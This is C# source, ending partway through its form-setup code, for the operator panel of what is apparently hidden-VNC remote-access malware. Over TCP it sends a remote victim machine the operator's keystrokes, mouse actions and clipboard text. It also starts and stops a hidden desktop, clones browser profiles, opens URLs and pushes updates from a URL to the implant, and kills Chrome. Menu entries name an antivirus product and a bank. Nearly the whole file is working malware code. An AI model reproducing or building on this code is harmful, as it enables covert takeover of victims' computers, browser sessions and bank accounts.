using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Siticone.Desktop.UI.WinForms;
using Siticone.Desktop.UI.WinForms.Enums;

namespace HVNC
{
	public class FrmVNC : Form
	{
		private TcpClient tcpClient_0;

		private int int_0;

		private bool bool_1;

		private bool bool_2;

		public FrmTransfer FrmTransfer0;

		private IContainer components;

		private Timer timer2;

		private ToolStripStatusLabel toolStripStatusLabel2;

		private ToolStripStatusLabel toolStripStatusLabel1;

		private Timer timer1;

		private PictureBox VNCBox;

		private ToolStripSeparator toolStripSeparator1;

		private SiticoneToggleSwitch siticoneToggleSwitch_0;

		private SiticoneGradientPanel siticoneGradientPanel1;

		private Label toolStripStatusLabel3;

		private Label IntervalLabel;

		private SiticoneBorderlessForm siticoneBorderlessForm1;

		private SiticoneDragControl siticoneDragControl1;

		private SiticoneToggleSwitch chkClone;

		private SiticoneTrackBar QualityScroll;

		private SiticoneTrackBar ResizeScroll;

		private SiticoneTrackBar IntervalScroll;
        private ContextMenuStrip contextMenuStrip1;
        private SiticoneGradientPanel siticoneGradientPanel4;
        private Label ledstatus;
        private Label label3;
        private Label chkClone1;
        private Label QualityLabel;
        private ToolStripMenuItem antivirusToolStripMenuItem1;
        private ToolStripMenuItem avastSecurityToolStripMenuItem;
        private ToolStripMenuItem openBrowserToolStripMenuItem;
        internal Guna.UI2.WinForms.Guna2GradientPanel PainelDrag;
        internal Guna.UI2.WinForms.Guna2CirclePictureBox Guna2CirclePictureBox3;
        internal Guna.UI2.WinForms.Guna2PictureBox Guna2PictureBox5;
        internal Guna.UI2.WinForms.Guna2HtmlLabel Guna2HtmlLabel1;
        internal Guna.UI2.WinForms.Guna2CirclePictureBox Guna2CirclePictureBox1;
        internal Guna.UI2.WinForms.Guna2GradientPanel Painel;
        private Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox1;
        private Guna.UI2.WinForms.Guna2Panel guna2Panel1;
        private Guna.UI2.WinForms.Guna2Panel Painel_1;
        internal Guna.UI2.WinForms.Guna2PictureBox Guna2PictureBox80;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel37;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox14;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel38;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox15;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel41;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox16;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel39;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox17;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel40;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox22;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox19;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel43;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel42;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox20;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox36;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel22;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox37;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel23;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox41;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel27;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox42;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel28;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox43;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel29;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox44;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel30;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox45;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel31;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox8;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel7;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox9;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel8;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox10;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel9;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox11;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel10;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox12;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel11;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox13;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel12;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox18;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel13;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox21;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel14;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox27;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel15;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox28;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel16;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox2;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel2;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox3;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel3;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox4;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel4;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox6;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel5;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox7;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel6;
        private Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox1;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox24;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel17;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox25;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel18;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox26;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel19;
        private Guna.UI2.WinForms.Guna2Transition guna2Transition1;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel20;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel24;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox29;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel25;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox30;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel26;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox31;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel32;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox32;
        private Guna.UI2.WinForms.Guna2ContextMenuStrip guna2ContextMenuStrip1;
        private ToolStripMenuItem itauToolStripMenuItem;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel33;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox33;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel34;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox34;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel35;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox35;
        internal Guna.UI2.WinForms.Guna2HtmlLabel guna2HtmlLabel36;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox38;
        internal Guna.UI2.WinForms.Guna2PictureBox Icon_Home;
        internal Guna.UI2.WinForms.Guna2PictureBox Icon_Application;
        internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox23;
        private SiticoneCirclePictureBox statusled;

		public PictureBox VNCBoxe
		{
			get
			{
				return VNCBox;
			}
			set
			{
				VNCBox = value;
			}
		}

		public ToolStripStatusLabel toolStripStatusLabel2_
		{
			get
			{
				return toolStripStatusLabel2;
			}
			set
			{
				toolStripStatusLabel2 = value;
			}
		}

		public static string labelstatus { get; set; }

		public FrmVNC()
		{
			int_0 = 0;
			bool_1 = true;
			bool_2 = false;
			FrmTransfer0 = new FrmTransfer();
			InitializeComponent();
			VNCBox.MouseEnter += VNCBox_MouseEnter;
			VNCBox.MouseLeave += VNCBox_MouseLeave;
			VNCBox.KeyPress += VNCBox_KeyPress;
		}

		private void VNCBox_MouseEnter(object sender, EventArgs e)
		{
			VNCBox.Focus();
		}

		private void VNCBox_MouseLeave(object sender, EventArgs e)
		{
			FindForm().ActiveControl = null;
			base.ActiveControl = null;
		}

		private void VNCBox_KeyPress(object sender, KeyPressEventArgs e)
		{
			SendTCP("7*" + Conversions.ToString(e.KeyChar), tcpClient_0);
		}
        public void testadmin()
        {
            System.Threading.Thread.Sleep(2000);
            chkClone.Checked = true;
            siticoneToggleSwitch_0.Checked = true;
        }


        private void VNCForm_Load(object sender, EventArgs e)
		{

            if (FrmTransfer0.IsDisposed)
			{
				FrmTransfer0 = new FrmTransfer();
			}
			FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
			tcpClient_0 = (TcpClient)base.Tag;
			VNCBox.Tag = new Size(1098, 639);
            testadmin();

        }

		public void Check()
		{
			try
			{
				if (FrmTransfer0.FileTransferLabele.Text == null)
				{
					toolStripStatusLabel3.Text = "Status";
				}
				else
				{
					toolStripStatusLabel3.Text = FrmTransfer0.FileTransferLabele.Text;
				}
			}
			catch
			{
			}
		}

		private void timer1_Tick(object sender, EventArgs e)
		{
			checked
			{
				int_0 += 100;
				if (int_0 >= SystemInformation.DoubleClickTime)
				{
					bool_1 = true;
					bool_2 = false;
					int_0 = 0;
				}
			}
		}

		private void CopyBtn_Click(object sender, EventArgs e)
		{
			SendTCP("9*", tcpClient_0);
		}

		private void PasteBtn_Click(object sender, EventArgs e)
		{
			try
			{
				SendTCP("10*" + Clipboard.GetText(), tcpClient_0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		private void ShowStart_Click(object sender, EventArgs e)
		{
			SendTCP("13*", tcpClient_0);
		}

		private void VNCBox_MouseDown(object sender, MouseEventArgs e)
		{
			if (bool_1)
			{
				bool_1 = false;
				timer1.Start();
			}
			else if (int_0 < SystemInformation.DoubleClickTime)
			{
				bool_2 = true;
			}
			Point location = e.Location;
			object tag = VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = (double)VNCBox.Width / (double)size.Width;
			double num2 = (double)VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling((double)location.X / num);
			double num4 = Math.Ceiling((double)location.Y / num2);
			if (bool_2)
			{
				if (e.Button == MouseButtons.Left)
				{
					SendTCP("6*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
				}
			}
			else if (e.Button == MouseButtons.Left)
			{
				SendTCP("2*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
			}
			else if (e.Button == MouseButtons.Right)
			{
				SendTCP("3*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
			}
		}

		private void VNCBox_MouseUp(object sender, MouseEventArgs e)
		{
			Point location = e.Location;
			object tag = VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = (double)VNCBox.Width / (double)size.Width;
			double num2 = (double)VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling((double)location.X / num);
			double num4 = Math.Ceiling((double)location.Y / num2);
			if (e.Button == MouseButtons.Left)
			{
				SendTCP("4*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
			}
			else if (e.Button == MouseButtons.Right)
			{
				SendTCP("5*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
			}
		}

		private void VNCBox_MouseMove(object sender, MouseEventArgs e)
		{
			Point location = e.Location;
			object tag = VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = (double)VNCBox.Width / (double)size.Width;
			double num2 = (double)VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling((double)location.X / num);
			double num4 = Math.Ceiling((double)location.Y / num2);
			SendTCP("8*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
		}

		private void IntervalScroll_Scroll(object sender, EventArgs e)
		{
			IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(IntervalScroll.Value);
			SendTCP("17*" + Conversions.ToString(IntervalScroll.Value), tcpClient_0);
		}

		private void QualityScroll_Scroll(object sender, EventArgs e)
		{
			QualityLabel.Text = "Quality : " + Conversions.ToString(QualityScroll.Value) + "%";
			SendTCP("18*" + Conversions.ToString(QualityScroll.Value), tcpClient_0);
		}

		private void ResizeScroll_Scroll(object sender, EventArgs e)
		{
			chkClone1.Text = "Resize : " + Conversions.ToString(ResizeScroll.Value) + "%";
			SendTCP("19*" + Conversions.ToString((double)ResizeScroll.Value / 100.0), tcpClient_0);
		}

		private void RestoreMaxBtn_Click(object sender, EventArgs e)
		{
			SendTCP("15*", tcpClient_0);
		}

		private void MinBtn_Click(object sender, EventArgs e)
		{
			SendTCP("14*", tcpClient_0);
		}

		private void CloseBtn_Click(object sender, EventArgs e)
		{

		}

		private void StartExplorer_Click(object sender, EventArgs e)
		{
			SendTCP("21*", tcpClient_0);
		}

		private void SendTCP(object object_0, TcpClient tcpClient_1)
		{
			checked
			{
				try
				{
					lock (tcpClient_1)
					{
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
						binaryFormatter.FilterLevel = TypeFilterLevel.Full;
						object objectValue = RuntimeHelpers.GetObjectValue(object_0);
						ulong num = 0uL;
						MemoryStream memoryStream = new MemoryStream();
						binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
						num = (ulong)memoryStream.Position;
						tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
						byte[] buffer = memoryStream.GetBuffer();
						tcpClient_1.GetStream().Write(buffer, 0, (int)num);
						memoryStream.Close();
						memoryStream.Dispose();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		private void VNCForm_KeyPress(object sender, KeyPressEventArgs e)
		{
			SendTCP("7*" + Conversions.ToString(e.KeyChar), tcpClient_0);
		}

		private void VNCForm_FormClosing(object sender, FormClosingEventArgs e)
		{
			SendTCP("1*", tcpClient_0);
			VNCBox.Image = null;
			GC.Collect();
			Dispose();
			Close();
			e.Cancel = true;
		}

		private void VNCForm_Click(object sender, EventArgs e)
		{
			method_18(null);
		}

		private void method_18(object object_0)
		{
			base.ActiveControl = (Control)object_0;
		}

		private void button1_Click(object sender, EventArgs e)
		{
			if (chkClone.Checked)
			{
				if (FrmTransfer0.IsDisposed)
				{
					FrmTransfer0 = new FrmTransfer();
				}
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				FrmTransfer0.Hide();
				SendTCP("30*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				SendTCP("30*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void timer2_Tick(object sender, EventArgs e)
		{
			Check();
		}

		private void closeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connection ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				SendTCP("24*", tcpClient_0);
				Close();
			}
		}

		private void button6_Click(object sender, EventArgs e)
		{
		}

		private void button7_Click(object sender, EventArgs e)
		{
			SendTCP("4875*", tcpClient_0);
		}

		private void button8_Click(object sender, EventArgs e)
		{
			SendTCP("4876*", tcpClient_0);
		}

		private void IntervalScroll_Scroll(object sender, ScrollEventArgs e)
		{
			IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(IntervalScroll.Value);
			SendTCP("17*" + Conversions.ToString(IntervalScroll.Value), tcpClient_0);
		}

		private void ResizeScroll_Scroll(object sender, ScrollEventArgs e)
		{

		}

		private void QualityScroll_Scroll(object sender, ScrollEventArgs e)
		{

		}

		private void guna2Button2_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				SendTCP("24*", tcpClient_0);
				Close();
			}
		}

		private void VNCBox_MouseHover(object sender, EventArgs e)
		{
			VNCBox.Focus();
		}

		private void guna2Button3_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connection ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				Close();
			}
		}

		private void fileExplorerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			
		}

		private void powershellToolStripMenuItem_Click(object sender, EventArgs e)
		{

		}

		private void cMDToolStripMenuItem_Click(object sender, EventArgs e)
		{
			
		}

		private void windowsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("13*", tcpClient_0);
		}

		private void test1ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			
		}

		private void test2ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			
		}

		private void braveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			
		}

		private void edgeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			
		}

		public void hURL(string url)
		{
			SendTCP("8585* " + url, (TcpClient)base.Tag);
		}

		public void UpdateClient(string url)
		{
			SendTCP("8589* " + url, (TcpClient)base.Tag);
		}

		public void CloseClient()
		{
			SendTCP("24*", (TcpClient)base.Tag);
		}

		public void ResetScale()
		{
			SendTCP("8587*", (TcpClient)base.Tag);
		}

		public void KillChrome()
		{
			SendTCP("8586*", (TcpClient)base.Tag);
		}

		private void exportbtn_Click(object sender, EventArgs e)
		{
		}

		private void copyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("3307*", tcpClient_0);
		}

		private void pasteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("3306*" + Clipboard.GetText(), (TcpClient)base.Tag);
		}

		private void ToggleHVNC_CheckedChanged(object sender, EventArgs e)
		{
			if (siticoneToggleSwitch_0.Checked)
			{
				SendTCP("0*", tcpClient_0);
				FrmTransfer0.FileTransferLabele.Text = "HVNC Started!";
			}
			else if (!siticoneToggleSwitch_0.Checked)
			{
				SendTCP("1*", tcpClient_0);
				VNCBox.Image = null;
				FrmTransfer0.FileTransferLabele.Text = "HVNC Stopped!";
				GC.Collect();
			}
		}

		private void toolStripStatusLabel3_TextChanged(object sender, EventArgs e)
		{
			labelstatus = FrmTransfer0.FileTransferLabele.Text;
			if (labelstatus == "Idle")
			{
				statusled.FillColor = Color.White;
			}
			else if (labelstatus.Contains("MB"))
			{
				ledstatus.Text = "Cloning Profile...";
				statusled.FillColor = Color.Yellow;
			}
			else if (labelstatus.Contains("initiated"))
			{
				ledstatus.Text = "Profile Cloned";
				statusled.FillColor = Color.FromArgb(4, 143, 110);
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
            this.components = new System.ComponentModel.Container();
            Guna.UI2.AnimatorNS.Animation animation2 = new Guna.UI2.AnimatorNS.Animation();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmVNC));
            this.QualityScroll = new Siticone.Desktop.UI.WinForms.SiticoneTrackBar();
            this.statusled = new Siticone.Desktop.UI.WinForms.SiticoneCirclePictureBox();
            this.ResizeScroll = new Siticone.Desktop.UI.WinForms.SiticoneTrackBar();
            this.siticoneGradientPanel4 = new Siticone.Desktop.UI.WinForms.SiticoneGradientPanel();
            this.siticoneToggleSwitch_0 = new Siticone.Desktop.UI.WinForms.SiticoneToggleSwitch();
            this.ledstatus = new System.Windows.Forms.Label();
            this.IntervalLabel = new System.Windows.Forms.Label();
            this.IntervalScroll = new Siticone.Desktop.UI.WinForms.SiticoneTrackBar();
            this.label3 = new System.Windows.Forms.Label();
            this.chkClone1 = new System.Windows.Forms.Label();
            this.QualityLabel = new System.Windows.Forms.Label();
            this.chkClone = new Siticone.Desktop.UI.WinForms.SiticoneToggleSwitch();
            this.timer2 = new System.Windows.Forms.Timer(this.components);
            this.toolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
            this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.VNCBox = new System.Windows.Forms.PictureBox();
            this.guna2ContextMenuStrip1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.itauToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.antivirusToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.avastSecurityToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.openBrowserToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
            this.siticoneGradientPanel1 = new Siticone.Desktop.UI.WinForms.SiticoneGradientPanel();
            this.toolStripStatusLabel3 = new System.Windows.Forms.Label();
            this.siticoneBorderlessForm1 = new Siticone.Desktop.UI.WinForms.SiticoneBorderlessForm(this.components);
            this.siticoneDragControl1 = new Siticone.Desktop.UI.WinForms.SiticoneDragControl(this.components);
            this.PainelDrag = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
            this.Guna2CirclePictureBox3 = new Guna.UI2.WinForms.Guna2CirclePictureBox();
            this.Guna2PictureBox5 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2HtmlLabel1 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2CirclePictureBox1 = new Guna.UI2.WinForms.Guna2CirclePictureBox();
            this.guna2PictureBox22 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel42 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox19 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel43 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Painel = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.Icon_Application = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Icon_Home = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
            this.Painel_1 = new Guna.UI2.WinForms.Guna2Panel();
            this.guna2PictureBox44 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel30 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox37 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel23 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox41 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel27 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox36 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel22 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel24 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel36 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox29 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel20 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel25 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox45 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel31 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox24 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel17 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox12 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel11 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox30 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox42 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox28 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel16 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox27 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel15 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox21 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel14 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox18 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel13 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox17 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel28 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox13 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel12 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel26 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox20 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox31 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox8 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox38 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel7 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel40 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel35 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel39 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox35 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox16 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel41 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox9 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel34 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel8 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox43 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox34 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel29 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel33 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel18 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox10 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox33 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel9 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox11 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel32 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox15 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox25 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel38 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox32 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox14 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel10 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel37 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox2 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel19 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox26 = new Guna.UI2.WinForms.Guna2PictureBox();
